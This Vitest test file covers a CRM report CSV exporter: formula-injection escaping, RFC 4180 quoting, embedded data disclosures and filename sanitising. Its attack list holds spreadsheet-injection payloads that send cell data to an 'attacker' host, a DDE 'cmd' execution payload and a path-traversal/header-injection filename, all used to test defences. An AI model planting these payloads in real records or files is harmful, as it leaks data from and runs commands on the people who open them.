import { describe, it, expect } from 'vitest';
import { escapeCell, toCsv, csvFilename } from '../services/reports/csv';
import type { ReportRun } from '../services/reports/runner';

/**
 * CSV EXPORT. P3 Phase 7. PURE — no database.
 *
 * Two things are being protected here and they are unrelated to each other:
 *
 *  1. THE FILE CANNOT ATTACK THE PERSON WHO OPENS IT. Dimension values are
 *     user-supplied (deal names, company names, sources), and a cell beginning
 *     `=` is executed by Excel and Sheets.
 *  2. THE FILE CANNOT MISREPRESENT WHAT IT CONTAINS. Once figures leave the
 *     screen the disclosure has to travel with them or it is gone.
 */

const run = (over: Partial<ReportRun> = {}): ReportRun => ({
  columns: [
    { key: 'deals.name', label: 'Deal', kind: 'dimension' },
    { key: 'metric:0', label: 'Sum of Value', kind: 'metric' },
  ],
  rows: [{ dim_0: 'Acme renewal', metric_0: '1000' }],
  provenance: {
    rows_returned: 1, rows_matched: 1, rows_seeded: 1, rows_real: 0,
    seeded_share: 1, mostly_seeded: true, excluded_test: 0,
    coverage: [], currencies: null, truncated: false, row_limit: 5000,
    disclosure: 'Based on 1 row, and it is seeded demo data.',
  },
  ms: 12,
  ...over,
});

const meta = { reportName: 'Revenue by Industry', generatedAt: '2026-09-23T10:00:00.000Z' };

describe('a cell cannot execute in the recipient\'s spreadsheet', () => {
  /*
   * CSV injection. The attacker needs one record whose name reaches a report
   * someone exports — in a shared CRM that is a low bar, and the victim is
   * whoever opens the file, who may not be in the workspace at all.
   */
  const attacks = [
    '=HYPERLINK("http://attacker/?x="&A1,"Q3 numbers")',
    '=WEBSERVICE("http://attacker/"&A1)',
    '+1+1',
    '@SUM(A1:A9)',
    '-1+1+cmd|\' /C calc\'!A0',
    '\tleading tab',
  ];

  for (const a of attacks) {
    it(`neutralises ${JSON.stringify(a.slice(0, 24))}`, () => {
      const out = escapeCell(a);
      // The apostrophe makes a spreadsheet read the rest as text. It must be
      // the FIRST character, before any quoting wrapper's content.
      const inner = out.startsWith('"') ? out.slice(1, -1) : out;
      expect(inner.startsWith("'")).toBe(true);
    });
  }

  it('does NOT mangle a negative number, because that would break every SUM', () => {
    /*
     * `-500` starts with a dangerous character and is also the likeliest
     * legitimate value in a revenue report. Prefixing it makes the cell text,
     * which silently breaks the recipient's arithmetic — a correctness bug
     * introduced by a security fix. A value that parses as a finite number is
     * exempt; the actual attack shape is NaN and is still caught (above).
     */
    expect(escapeCell('-500')).toBe('-500');
    expect(escapeCell(-500)).toBe('-500');
    expect(escapeCell('-1.5e3')).toBe('-1.5e3');
  });

  it('still quotes per RFC 4180 on top of neutralising', () => {
    expect(escapeCell('a,b')).toBe('"a,b"');
    expect(escapeCell('say "hi"')).toBe('"say ""hi"""');
    expect(escapeCell('two\nlines')).toBe('"two\nlines"');
    // Both at once: a formula AND a separator.
    expect(escapeCell('=A1,B1')).toBe('"\'=A1,B1"');
  });

  it('writes an empty cell for null, not the word null', () => {
    expect(escapeCell(null)).toBe('');
    expect(escapeCell(undefined)).toBe('');
  });
});

describe('the disclosure travels inside the file', () => {
  it('puts the server\'s sentence ABOVE the data', () => {
    const csv = toCsv(run(), meta);
    const noteAt = csv.indexOf('Based on 1 row');
    const headerAt = csv.indexOf('Deal,Sum of Value');
    expect(noteAt).toBeGreaterThan(-1);
    expect(headerAt).toBeGreaterThan(-1);
    // A reader who stops early must still have been told.
    expect(noteAt).toBeLessThan(headerAt);
  });

  it('carries the figures behind the sentence, so it can be checked not trusted', () => {
    const csv = toCsv(run({
      provenance: { ...run().provenance,
        coverage: [{ kind: 'dimension', key: 'companies.industry', label: 'Industry', matched: 16, of: 18 }] },
    }), meta);
    expect(csv).toContain('Rows behind these figures,1');
    expect(csv).toContain('Industry recorded,16 of 18');
  });

  it('states an unmeasurable seeded count as such, never as 0', () => {
    const csv = toCsv(run({
      provenance: { ...run().provenance, rows_seeded: null, rows_real: null, seeded_share: null },
    }), meta);
    expect(csv).toContain('not recorded for this module');
    expect(csv).not.toMatch(/Seeded demo rows,0/);
  });

  it('shouts about truncation in its own row, not only inside the sentence', () => {
    // A truncated export that looks complete is the worst artefact this
    // feature could produce: nothing on the page warns the person who opens it.
    const csv = toCsv(run({
      provenance: { ...run().provenance, truncated: true, row_limit: 5000 },
    }), meta);
    expect(csv).toContain('TRUNCATED');
    expect(csv).toContain('There are more.');
  });

  it('names mixed currencies, because the totals are not money', () => {
    const csv = toCsv(run({
      provenance: { ...run().provenance, currencies: ['AED', 'USD'] },
    }), meta);
    expect(csv).toContain('AED, USD');
    expect(csv).toContain('not meaningful as money');
  });

  it('carries a canned report\'s structural caveat too', () => {
    const csv = toCsv(run(), { ...meta, caveat: 'Industry lives on the account.' });
    expect(csv).toContain('About this report,Industry lives on the account.');
  });
});

describe('the data block', () => {
  it('names a null DIMENSION and leaves a null METRIC empty', () => {
    // Same split as both UI surfaces: a null bucket is a thing, a null
    // aggregate is an absence.
    const csv = toCsv(run({ rows: [{ dim_0: null, metric_0: null }] }), meta);
    const dataLine = csv.trimEnd().split('\r\n').pop()!;
    expect(dataLine).toBe('Not recorded,');
  });

  it('keeps column order and maps metric indices independently of position', () => {
    const csv = toCsv(run({
      columns: [
        { key: 'a', label: 'A', kind: 'dimension' },
        { key: 'b', label: 'B', kind: 'dimension' },
        { key: 'm', label: 'M', kind: 'metric' },
      ],
      rows: [{ dim_0: 'x', dim_1: 'y', metric_0: '9' }],
    }), meta);
    expect(csv.trimEnd().endsWith('A,B,M\r\nx,y,9')).toBe(true);
  });

  it('ends with CRLF, which is what RFC 4180 specifies', () => {
    expect(toCsv(run(), meta).endsWith('\r\n')).toBe(true);
  });
});

describe('the filename says which report and when', () => {
  it('slugifies and dates it', () => {
    expect(csvFilename('Revenue by Industry', '2026-09-23T10:00:00.000Z'))
      .toBe('revenue-by-industry-2026-09-23.csv');
  });

  it('survives a name made entirely of punctuation', () => {
    // A user-supplied report name reaches this. An empty slug would produce
    // "-2026-09-23.csv", which some clients refuse to save.
    expect(csvFilename('!!!', '2026-09-23T10:00:00.000Z')).toBe('report-2026-09-23.csv');
  });

  it('cannot inject a path or a header break', () => {
    const f = csvFilename('../../etc/passwd\r\nX-Evil: 1', '2026-09-23T10:00:00.000Z');
    expect(f).not.toContain('/');
    expect(f).not.toContain('..');
    expect(f).not.toMatch(/[\r\n]/);
  });
});
